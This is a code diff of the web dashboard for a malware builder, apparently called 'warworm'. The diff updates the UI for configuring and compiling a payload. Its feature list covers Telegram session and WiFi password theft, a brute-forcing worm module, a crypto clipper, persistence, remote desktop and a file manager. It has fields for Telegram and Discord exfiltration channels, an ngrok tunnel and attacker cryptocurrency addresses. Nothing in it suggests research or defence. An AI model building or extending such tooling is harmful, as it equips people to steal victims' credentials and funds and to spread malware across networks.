-            document.getElementById('activeModules').textContent = count;
-        }
-
-        // Update all UI elements
         function updateAllUI() {
-            // Update toggles
-            Object.keys(config.pyinstaller_settings).forEach(key => {
+            console.log('[DASHBOARD] Updating UI with config:', config);
+            
+            // Update build settings toggles
+            Object.keys(config.pyinstaller_settings || {}).forEach(key => {
                 const el = document.getElementById(`toggle-${key}`);
                 if (el) {
                     el.classList.toggle('active', config.pyinstaller_settings[key]);
                 }
             });
-
+            
             // Update delivery inputs
-            document.getElementById('telegramToken').value = config.delivery.telegram_token;
-            document.getElementById('telegramChatId').value = config.delivery.telegram_chat_id;
-            document.getElementById('discordWebhook').value = config.delivery.discord_webhook;
-
+            const telegramToken = document.getElementById('telegramToken');
+            const telegramChatId = document.getElementById('telegramChatId');
+            const discordWebhook = document.getElementById('discordWebhook');
+            const ngrokToken = document.getElementById('ngrokToken');
+            const rmmPassword = document.getElementById('rmmPassword');
+            const rmmPort = document.getElementById('rmmPort');
+            
+            if (telegramToken) telegramToken.value = config.delivery?.telegram_token || '';
+            if (telegramChatId) telegramChatId.value = config.delivery?.telegram_chat_id || '';
+            if (discordWebhook) discordWebhook.value = config.delivery?.discord_webhook || '';
+            if (ngrokToken) ngrokToken.value = config.ngrok_token || '';
+            if (rmmPassword) rmmPassword.value = config.remote_access_password || '';
+            if (rmmPort) rmmPort.value = config.rmm_port || 5000;
+            
             // Update crypto inputs
-            document.getElementById('btcAddress').value = config.crypto_addresses.Bitcoin;
-            document.getElementById('ethAddress').value = config.crypto_addresses.Ethereum;
-            document.getElementById('ltcAddress').value = config.crypto_addresses.Litecoin;
-            document.getElementById('xmrAddress').value = config.crypto_addresses.Monero;
-            document.getElementById('dogeAddress').value = config.crypto_addresses.Dogecoin;
-
-            // Update auto_brute checkbox
-            const autoBruteCheckbox = document.getElementById('checkbox-auto_brute');
-            const autoBruteItem = document.getElementById('feature-auto_brute');
-            if (autoBruteCheckbox) {
-                if (config.features.auto_brute) {
-                    autoBruteCheckbox.classList.add('selected');
-                    if (autoBruteItem) autoBruteItem.classList.add('selected');
-                } else {
-                    autoBruteCheckbox.classList.remove('selected');
-                    if (autoBruteItem) autoBruteItem.classList.remove('selected');
-                }
-            }
-
+            document.getElementById('btcAddress').value = config.crypto_addresses?.Bitcoin || '';
+            document.getElementById('ethAddress').value = config.crypto_addresses?.Ethereum || '';
+            document.getElementById('ltcAddress').value = config.crypto_addresses?.Litecoin || '';
+            document.getElementById('xmrAddress').value = config.crypto_addresses?.Monero || '';
+            
             // Update module UIs
             Object.keys(modules).forEach(mod => {
                 updateModuleUI(mod);
                 updateModuleCardState(mod);
             });
-
-            // Update sub-configs
-            document.getElementById('config-network').classList.toggle('active', config.features.network_scan);
-            document.getElementById('config-crypto').classList.toggle('active', config.features.crypto_clipper);
-            document.getElementById('checkbox-auto_brute').classList.toggle('selected', config.features.auto_brute);
+            
+            // Update sub-configs visibility
+            const networkConfig = document.getElementById('config-network');
+            const cryptoConfig = document.getElementById('config-crypto');
+            const rmmConfig = document.getElementById('config-rmm');
+            
+            if (networkConfig) networkConfig.classList.toggle('active', config.features?.network_scan);
+            if (cryptoConfig) cryptoConfig.classList.toggle('active', config.features?.crypto_clipper);
+            if (rmmConfig) rmmConfig.classList.toggle('active', 
+                config.features?.remote_desktop || config.features?.file_manager);
+            
+            const autoBruteCheckbox = document.getElementById('checkbox-auto_brute');
+            if (autoBruteCheckbox) autoBruteCheckbox.classList.toggle('selected', config.features?.auto_brute);
+            
+            console.log('[DASHBOARD] UI update complete');
         }
 
-        // Update build preview
         function updateBuildPreview() {
             const preview = document.getElementById('buildPreview');
             const items = [
@@ -1356,16 +1674,18 @@
                 { name: 'Telegram Session', key: 'telegram_session' },
                 { name: 'Network Scanner', key: 'network_scan' },
                 { name: 'WiFi Passwords', key: 'wifi_passwords' },
-                { name: 'Worm Network (Bruteforce)', key: 'auto_brute' },
+                { name: 'Worm Network', key: 'auto_brute' },
+                { name: 'Remote Desktop', key: 'remote_desktop' },
+                { name: 'File Manager', key: 'file_manager' },
                 { name: 'Crypto Clipper', key: 'crypto_clipper' },
                 { name: 'Persistence', key: 'persistence' }
             ];
-
+            
             preview.innerHTML = items.map(item => {
                 const enabled = config.features[item.key];
                 return `
                     <div class="build-item">
-                        <span>${item.name}</span>
+                        <span style="color: var(--text-secondary);">${item.name}</span>
                         <span class="${enabled ? 'status-enabled' : 'status-disabled'}">
                             ${enabled ? '✓ Enabled' : '✗ Disabled'}
                         </span>
@@ -1374,68 +1694,68 @@
             }).join('');
         }
 
-        // Show toast notification
         function showToast(msg, type = 'success') {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
-            toast.className = 'toast ' + type;
+            toast.className = `toast ${type}`;
             const icon = type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ';
-            toast.innerHTML = icon + ' ' + msg;
+            toast.innerHTML = `<strong>${icon}</strong> ${msg}`;
             container.appendChild(toast);
             setTimeout(() => toast.remove(), 3000);
         }
 
-        // Auto save to backend and localStorage
         function autoSave() {
             config.last_updated = new Date().toISOString();
-            
-            // Save to localStorage as backup
             localStorage.setItem('warworm_config', JSON.stringify(config));
-            
-            // Save to config_db.json via API
-            fetch('/api/save', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(config)
-            }).then(response => response.json())
-            .then(data => {
-                if(data.success) {
-                    console.log('Config saved to config_db.json');
-                }
-            }).catch(err => {
-                console.error('Failed to save to config_db.json:', err);
-                showToast('Saved locally (server error)', 'warning');
-            });
         }
 
-        // Load from config_db.json via API
+        async function saveConfiguration() {
+            try {
+                const response = await fetch('/api/save', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(config)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showToast('Configuration saved to server', 'success');
+                } else {
+                    showToast('Save failed: ' + result.message, 'error');
+                }
+            } catch (e) {
+                showToast('Saved locally (server error)', 'warning');
+            }
+        }
+
         async function loadFromConfigDB() {
             try {
                 const response = await fetch('/api/config');
+                console.log('[DASHBOARD] Server response status:', response.status);
+                
                 if (response.ok) {
                     const serverConfig = await response.json();
+                    console.log('[DASHBOARD] Received config:', serverConfig);
+                    
                     if (serverConfig && Object.keys(serverConfig).length > 0) {
                         config = deepMerge(config, serverConfig);
-                        updateAllUI();
-                        renderBrowsers();
-                        renderPorts();
-                        showToast('Configuration loaded from config_db.json', 'success');
+                        console.log('[DASHBOARD] Config merged successfully');
+                        showToast('Configuration loaded from server', 'success');
                         return true;
                     }
                 }
             } catch (e) {
-                console.log('config_db.json not available, falling back to localStorage');
+                console.error('[DASHBOARD] Failed to load from server:', e);
             }
             return false;
         }
 
-        // Load from localStorage
         function loadFromLocalStorage() {
             const saved = localStorage.getItem('warworm_config');
             if (saved) {
                 try {
                     const parsed = JSON.parse(saved);
-                    // Deep merge to preserve nested objects
                     config = deepMerge(config, parsed);
                     updateAllUI();
                     renderBrowsers();
@@ -1447,45 +1767,124 @@
             }
         }
 
-        // Deep merge helper
         function deepMerge(target, source) {
+            if (!source || typeof source !== 'object') return target;
+            
             for (const key in source) {
-                if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
-                    target[key] = deepMerge(target[key] || {}, source[key]);
-                } else {
-                    target[key] = source[key];
+                if (source.hasOwnProperty(key)) {
+                    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
+                        target[key] = deepMerge(target[key] || {}, source[key]);
+                    } else {
+                        target[key] = source[key];
+                    }
                 }
             }
             return target;
         }
 
-        // Build function
+        // async function build() {
+        //     const btn = document.getElementById('buildBtn');
+        //     btn.disabled = true;
+        //     btn.innerHTML = '<span class="loading"></span> Building...';
+            
+        //     try {
+        //         const response = await fetch('/api/build', {
+        //             method: 'POST',
+        //             headers: { 'Content-Type': 'application/json' },
+        //             body: JSON.stringify(config)
+        //         });
+                
+        //         const result = await response.json();
+                
+        //         if (result.success) {
+        //             showToast('Build successful! Downloading...', 'success');
+        //             window.location.href = result.download_url;
+        //         } else {
+        //             showToast('Build failed: ' + result.message, 'error');
+        //         }
+        //     } catch (e) {
+        //         showToast('Error: ' + e.message, 'error');
+        //     }
+            
+        //     btn.disabled = false;
+        //     btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
+        // }
+
         async function build() {
             const btn = document.getElementById('buildBtn');
             btn.disabled = true;
-            btn.innerHTML = '<span class="loading"></span> Building...';
-
+            btn.innerHTML = '<span class="loading"></span> Starting build...';
+            
             try {
                 const response = await fetch('/api/build', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(config)
                 });
-
+                
                 const result = await response.json();
-
-                if (result.success) {
-                    showToast('Build successful! Downloading...');
-                    window.location.href = result.download_url;
+                
+                if (result.success && result.build_id) {
+                    showToast('Build started...', 'info');
+                    pollBuildStatus(result.build_id, btn);
                 } else {
                     showToast('Build failed: ' + result.message, 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
                 }
             } catch (e) {
                 showToast('Error: ' + e.message, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
             }
+        }
 
-            btn.disabled = false;
-            btn.innerHTML = '⬇️ Build & Download';
+        function pollBuildStatus(buildId, btn) {
+            const checkUrl = `/api/build/status/${buildId}`;
+            let dots = 0;
+            
+            const pollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(checkUrl);
+                    const data = await res.json();
+                    
+                    dots = (dots + 1) % 4;
+                    const dotsStr = '.'.repeat(dots);
+                    
+                    if (data.status === 'building' || data.status === 'starting') {
+                        btn.innerHTML = `<span class="loading"></span> ${data.progress}${dotsStr}`;
+                    } else if (data.status === 'completed') {
+                        clearInterval(pollInterval);
+                        showToast('Build complete! Downloading...', 'success');
+                        btn.innerHTML = '<span>✓</span><span>Complete!</span>';
+                        btn.style.background = 'linear-gradient(135deg, #00ff88, #00cc6a)';
+                        window.location.href = data.download_url;
+                        
+                        setTimeout(() => {
+                            btn.disabled = false;
+                            btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
+                            btn.style.background = '';
+                        }, 3000);
+                    } else if (data.status === 'failed') {
+                        clearInterval(pollInterval);
+                        showToast('Build failed: ' + (data.error || 'Unknown error'), 'error');
+                        btn.disabled = false;
+                        btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
+                    }
+                } catch (e) {
+                    console.error('Poll error:', e);
+                }
+            }, 2000); // Check every 2 seconds
+            
+            // Timeout after 5 minutes
+            setTimeout(() => {
+                clearInterval(pollInterval);
+                if (btn.disabled) {
+                    showToast('Build timeout', 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = '<span>⬇️</span><span>Build & Download</span>';
+                }
+            }, 300000);
         }
 
         // Initialize on load
